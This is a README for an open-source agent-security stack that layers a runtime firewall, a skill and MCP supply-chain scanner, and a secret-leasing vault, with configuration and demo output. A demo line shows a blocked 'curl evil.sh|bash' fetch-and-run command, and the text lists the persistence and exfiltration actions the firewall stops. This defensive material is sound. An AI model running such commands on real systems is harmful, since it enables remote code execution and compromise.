# agent-security-stack

> The open-source agent-security stack — **[warden](https://github.com/askalf/warden) · [canon](https://github.com/askalf/canon) · [keeper](https://github.com/askalf/keeper)** — composed into one layered defense. Part of **[Own Your Stack](https://github.com/askalf)**.

OpenClaw became 2026's first big AI-security disaster three ways at once: one-click **RCE**, a **poisoned skills** marketplace, and ~135k **leaked credentials**. Three failure modes — three small, open-source, zero-dependency tools that compose into one defense:

| | own your… | closes | role |
|---|---|---|---|
| **[warden](https://github.com/askalf/warden)** | agent security | RCE · exfil · SSRF · prompt-injection | the **runtime firewall** — what a tool may *do* |
| **[canon](https://github.com/askalf/canon)** | agent skills | poisoned / drifted skills & MCP servers | the **supply-chain gate** — which tools may *exist* |
| **[keeper](https://github.com/askalf/keeper)** | agent secrets | leaked API keys / credentials | the **vault** — a lease, never the key |

They aren't three islands — they share one spine: canon reuses warden's scanner, keeper reuses warden's tamper-evident audit. `npm install` dedupes warden to a single shared copy. The three are **pinned to vetted commits**, so the stack is itself a reproducible supply chain — the thing it's protecting.

## The whole stack in one guarded call

```js
function guardedCall({ tool, action, lease }) {
  if (!canonVetted(tool))     return blocked('canon');   // supply chain  — is the tool pinned, unmodified, unpoisoned?
  if (warden.blocks(action))  return blocked('warden');  // runtime       — is the action safe?
  if (!keeper.redeems(lease)) return blocked('keeper');  // secrets       — is there a valid, scoped lease?
  return proceed();
}
```

A tool call proceeds **only when all three agree**. Flip any one layer to "bad" and the call stops there — `canon` before `warden` before `keeper`.

## Drop in at runtime — no app changes

The `guardedCall` above is the composition in one function; each layer also ships a **drop-in enforcer** so the same defense holds at the process / network boundary with no code changes:

- **`canon-mcp`** — an MCP proxy in front of a server: only pinned, unmodified, unpoisoned tools survive `tools/list`, and a call to anything it dropped is blocked. *Which tools may exist.*
- **`warden-mcp`** — an MCP proxy that firewalls every `tools/call` (RCE, exfil, SSRF, prompt-injection, and OS-persistence: cron / systemd-user / scheduled-task / WMI / registry-autorun) and strips poisoned tools before the client sees them; optional daemon, native fast hook, and a gray-zone LLM judge that can only *raise* risk. *What a call may do.*
- **`keeper broker`** — point your API client's base URL at it with no key; for each call it redeems a scoped, single-use lease and injects the real secret at egress, bound to one upstream. *A key the agent never holds.*

Chain them — `client → canon-mcp → warden-mcp → server`, egress through `keeper broker` — and a tool must be **vetted to exist, safe to run, and hold a valid lease to touch a secret**. Same three-way agreement as `guardedCall`, enforced live.

## One MCP server — call the whole stack

The proxies above enforce *mandatorily, in the path*. `oys-mcp` is the complementary **on-demand** surface: one MCP server that hands any client — Claude Desktop, Claude Code, any agent runtime — the whole suite as callable tools, so an agent can ask the stack to vet content, actions, and secrets mid-task.

| tool | layer | does |
|------|-------|------|
| `warden_check` | contain | is this `{tool, input}` safe to run? → allow / approve / block + why |
| `canon_scan` | vet | scan an MCP/skill manifest (JSON) for poisoning → clean / flagged |
| `keeper_lease` | key | lease a vault secret → an **opaque handle**; the secret never returns |
| `cordon_redact` | sanitize | strip PII/secrets from text → typed placeholders + tally |
| `picket_observe` | read | firewall an untrusted web page → safe view, injection withheld |

```json
{
  "mcpServers": {
    "own-your-stack": {
      "command": "npx",
      "args": ["-y", "agent-security-stack", "oys-mcp"],
      "env": {
        "KEEPER_HOME": "/path/to/keeper/vault",
        "PICKET_CDP": "http://127.0.0.1:9222",
        "PICKET_ALLOWLIST": "example.com",
        "OYS_WARDEN_POLICY": "{\"egressAllow\":[\"api.example.com\"]}"
      }
    }
  }
}
```

Each tool wraps the real library (`@askalf/warden`, `@askalf/canon`, `@askalf/keeper`, `@askalf/picket`, cordon's detector) — no reimplementation. `keeper_lease` returns only the lease handle; the secret is materialized at egress, never through the tool. (`warden-mcp` / `canon-mcp` remain the deployment-grade *mandatory* mode.)

## Run it

```bash
npm install     # pulls warden + canon + keeper + picket + cordon
npm run demo    # the layered defense: a clean call proceeds; a poisoned tool, a curl|bash, and a spent lease each get stopped
npm run demo:mcp  # drive all five tools over the MCP protocol
npm test        # the same compositions, as assertions
```

```text
1. vetted tool, safe GET, valid lease          {"ok":true}            the call proceeds
2. a POISONED tool                             {"ok":false,"by":"canon"}    <- canon stops it
3. a vetted tool that tries curl evil.sh|bash  {"ok":false,"by":"warden"}   <- warden stops it
4. a vetted tool whose lease is spent          {"ok":false,"by":"keeper"}   <- keeper stops it
```

*vet it (canon) → contain it (warden) → key it never holds (keeper).*

## Beyond the core trio

The trio above guards the **tool-call** path. The same idea — govern the agent, don't trust the surface — extends to other surfaces:

- **[picket](https://github.com/askalf/picket)** — own your agent **browser**: an indirect-prompt-injection firewall + action gate that wraps a CDP browser, so an agent can read a hostile web page without being hijacked by it (the lethal trifecta, delivered by the page). It carries the same spine onto the browser — a warden-style action gate (allowlist + step-up) and keeper-style credential leases filled at the CDP layer, so the agent never holds the secret.

---
Part of **[Own Your Stack](https://github.com/askalf)** — own your AI infrastructure instead of renting it. Built by Thomas Sprayberry.
